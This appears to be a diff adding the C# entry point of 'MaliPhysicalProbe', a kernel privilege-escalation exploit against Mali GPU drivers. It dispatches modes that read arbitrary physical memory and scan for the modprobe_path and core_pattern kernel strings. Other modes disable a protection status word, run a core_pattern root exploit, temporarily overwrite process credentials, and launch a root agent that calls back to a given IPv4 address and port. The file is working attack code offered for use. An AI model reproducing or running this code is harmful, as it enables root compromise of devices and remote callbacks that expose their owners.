@@ -1,0 +1,275 @@
+using System;
+using System.Globalization;
+using System.Runtime.InteropServices;
+
+internal static class Program
+{
+    private const uint EncodedModprobePath0 = 0xcca16c08;
+    private const uint EncodedModprobePath1 = 0x74ea1afd;
+    private const uint EncodedModprobePath2 = 0xbb5c11dd;
+    private const uint EncodedModprobePath3 = 0x6f90a13f;
+    private const uint EncodedCorePattern0 = 0xc0b17044;
+    private const uint EncodedCorePattern1 = 0x1b873593;
+    private const uint EncodedCorePattern2 = 0xd42e61b9;
+    private const uint EncodedCorePattern3 = 0x6f90c45d;
+
+    public static int Main(string[] arguments)
+    {
+        bool launchRootAgent = arguments.Length == 4
+            && arguments[0] == "launch-root-agent";
+        bool readPhysical = (arguments.Length == 2 || arguments.Length == 3)
+            && arguments[0] == "read-physical";
+        bool singleArgumentMode = arguments.Length == 1
+            && (arguments[0] == "mem-commit"
+                || arguments[0] == "pattern-scan"
+                || arguments[0] == "inspect-uep"
+                || arguments[0] == "disable-uep"
+                || arguments[0] == "root-core-pattern"
+                || arguments[0] == "scan-core-pattern"
+                || arguments[0] == "scan-modprobe"
+                || arguments[0] == "scan-task"
+                || arguments[0] == "scan-task-private"
+                || arguments[0] == "prove-root-task"
+                || arguments[0] == "own-page-alias"
+                || arguments[0] == "own-page-write");
+        if (!singleArgumentMode && !readPhysical && !launchRootAgent)
+        {
+            Console.Error.WriteLine(
+                "usage: MaliPhysicalProbe.dll mem-commit|pattern-scan|inspect-uep|disable-uep|root-core-pattern|scan-core-pattern|scan-modprobe|scan-task|scan-task-private|prove-root-task|own-page-alias|own-page-write|read-physical ADDRESS [WORDS]|launch-root-agent CALLBACK_IPV4 PORT TOKEN_FILE");
+            return 2;
+        }
+
+        ulong readPhysicalAddress = 0;
+        int readPhysicalWords = 0;
+        if (readPhysical
+            && (!TryParsePhysicalAddress(arguments[1], out readPhysicalAddress)
+                || (arguments.Length == 3
+                    && !int.TryParse(
+                        arguments[2],
+                        NumberStyles.None,
+                        CultureInfo.InvariantCulture,
+                        out readPhysicalWords))))
+        {
+            Console.Error.WriteLine("invalid read-physical arguments");
+            return 2;
+        }
+        if (readPhysical)
+        {
+            if (arguments.Length == 2)
+            {
+                readPhysicalWords = 1;
+            }
+            ulong pageOffset = readPhysicalAddress & (MaliNative.PageSize - 1);
+            if (readPhysicalWords < 1
+                || readPhysicalWords > 16
+                || pageOffset + ((ulong)readPhysicalWords * sizeof(uint))
+                    > MaliNative.PageSize)
+            {
+                Console.Error.WriteLine(
+                    "read-physical is limited to 1 through 16 words within one page");
+                return 2;
+            }
+        }
+
+        RootAgentLaunch rootAgent = null;
+        if (launchRootAgent)
+        {
+            int callbackPort;
+            if (!int.TryParse(arguments[2], out callbackPort))
+            {
+                Console.Error.WriteLine("invalid root-agent callback port");
+                return 2;
+            }
+            rootAgent = new RootAgentLaunch(
+                arguments[1],
+                callbackPort,
+                arguments[3]);
+        }
+
+        Console.WriteLine("probe={0}", arguments[0]);
+        Console.WriteLine("pointer_size={0}", IntPtr.Size);
+        Console.WriteLine("architecture={0}", RuntimeInformation.ProcessArchitecture);
+        Console.WriteLine(
+            "arbitrary_physical_page_accessed={0}",
+            arguments[0] == "disable-uep"
+                ? "one-word-write"
+                : arguments[0] == "inspect-uep"
+                    || readPhysical
+                    ? "read-only"
+                : arguments[0] == "root-core-pattern"
+                ? "temporary-write-and-restore"
+                : arguments[0] == "prove-root-task"
+                    || launchRootAgent
+                    ? "temporary-credential-write-and-restore"
+                : arguments[0].StartsWith("scan-", StringComparison.Ordinal)
+                    ? "read-only"
+                    : "no");
+        Console.WriteLine(
+            "credentials_modified={0}",
+            arguments[0] == "prove-root-task" || launchRootAgent
+                ? "temporary"
+                : "no");
+        Console.WriteLine(
+            "kernel_data_modified={0}",
+            arguments[0] == "disable-uep"
+                ? "one-word-volatile-uep-status-write"
+                : arguments[0] == "root-core-pattern"
+                || arguments[0] == "prove-root-task"
+                || launchRootAgent
+                ? "temporary"
+                : "no");
+
+        try
+        {
+            using (EglComputeContext compute = EglComputeContext.Create())
+            {
+                Console.WriteLine("mali_fd={0}", compute.MaliFileDescriptor);
+                if (arguments[0] == "mem-commit")
+                {
+                    MaliCommitProbe commit = new MaliCommitProbe(
+                        compute.MaliFileDescriptor);
+                    bool commitPassed = commit.Run(compute);
+                    return commitPassed ? 0 : 1;
+                }
+                if (arguments[0] == "pattern-scan")
+                {
+                    MaliPatternProbe pattern = new MaliPatternProbe(
+                        compute.MaliFileDescriptor);
+                    bool patternPassed = pattern.Run(compute);
+                    return patternPassed ? 0 : 1;
+                }
+                MaliPageTableReclaim reclaim = new MaliPageTableReclaim(
+                    compute.MaliFileDescriptor);
+                if (readPhysical)
+                {
+                    MaliPageTableReclaim.PhysicalMemoryAccessor physical =
+                        reclaim.AcquirePhysicalMemoryAccessor(compute);
+                    uint[] words = physical.ReadWords(
+                        readPhysicalAddress,
+                        readPhysicalWords);
+                    Console.WriteLine(
+                        "physical_read_address=0x{0:x}",
+                        readPhysicalAddress);
+                    for (int index = 0; index < words.Length; index++)
+                    {
+                        Console.WriteLine(
+                            "physical_read_word[{0}]=0x{1:x8}",
+                            index,
+                            words[index]);
+                    }
+                    return 0;
+                }
+                if (arguments[0] == "inspect-uep"
+                    || arguments[0] == "disable-uep")
+                {
+                    UepStatusControl uep = new UepStatusControl(
+                        compute,
+                        reclaim);
+                    bool valid = uep.Run(arguments[0] == "disable-uep");
+                    return valid ? 0 : 1;
+                }
+                if (arguments[0] == "root-core-pattern")
+                {
+                    CorePatternRootExploit exploit = new CorePatternRootExploit(
+                        compute,
+                        reclaim);
+                    bool rooted = exploit.Run();
+                    Console.WriteLine(
+                        "root_core_pattern={0}",
+                        rooted ? "pass" : "fail");
+                    return rooted ? 0 : 1;
+                }
+                if (arguments[0] == "scan-core-pattern")
+                {
+                    ulong found = reclaim.FindPhysicalPatternRange(
+                        compute,
+                        EncodedCorePattern0,
+                        EncodedCorePattern1,
+                        EncodedCorePattern2,
+                        EncodedCorePattern3,
+                        delegate { },
+                        0x20000000UL,
+                        0x24000000UL);
+                    Console.WriteLine(
+                        "core_pattern_physical={0}",
+                        found == ulong.MaxValue
+                            ? "not-found"
+                            : string.Format("0x{0:x}", found));
+                    return found == ulong.MaxValue ? 1 : 0;
+                }
+                if (arguments[0] == "scan-modprobe")
+                {
+                    ulong found = reclaim.FindPhysicalPatternRange(
+                        compute,
+                        EncodedModprobePath0,
+                        EncodedModprobePath1,
+                        EncodedModprobePath2,
+                        EncodedModprobePath3,
+                        delegate { },
+                        0x20000000UL,
+                        0x24000000UL);
+                    Console.WriteLine(
+                        "modprobe_path_physical={0}",
+                        found == ulong.MaxValue
+                            ? "not-found"
+                            : string.Format("0x{0:x}", found));
+                    return found == ulong.MaxValue ? 1 : 0;
+                }
+                if (arguments[0] == "scan-task"
+                    || arguments[0] == "scan-task-private"
+                    || arguments[0] == "prove-root-task"
+                    || launchRootAgent)
+                {
+                    TaskCredentialProbe task = new TaskCredentialProbe(
+                        compute,
+                        reclaim);
+                    return task.Inspect(
+                        arguments[0] != "scan-task",
+                        arguments[0] == "prove-root-task",
+                        rootAgent) ? 0 : 1;
+                }
+                bool passed = reclaim.ProveOwnPageAlias(
+                    compute,
+                    arguments[0] == "own-page-write");
+                Console.WriteLine("own_page_alias={0}", passed ? "pass" : "fail");
+                return passed ? 0 : 1;
+            }
+        }
+        catch (Exception exception)
+        {
+            Console.Error.WriteLine(
+                "exception={0}: {1}",
+                exception.GetType().Name,
+                exception.Message);
+            return 1;
+        }
+    }
+
+    private static bool TryParsePhysicalAddress(string value, out ulong address)
+    {
+        address = 0;
+        if (string.IsNullOrEmpty(value))
+        {
+            return false;
+        }
+        NumberStyles style = NumberStyles.None;
+        string digits = value;
+        if (value.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
+        {
+            style = NumberStyles.AllowHexSpecifier;
+            digits = value.Substring(2);
+        }
+        if (digits.Length == 0
+            || !ulong.TryParse(
+                digits,
+                style,
+                CultureInfo.InvariantCulture,
+                out address))
+        {
+            return false;
+        }
+        return address <= uint.MaxValue
+            && (address & (sizeof(uint) - 1)) == 0;
+    }
+
+}
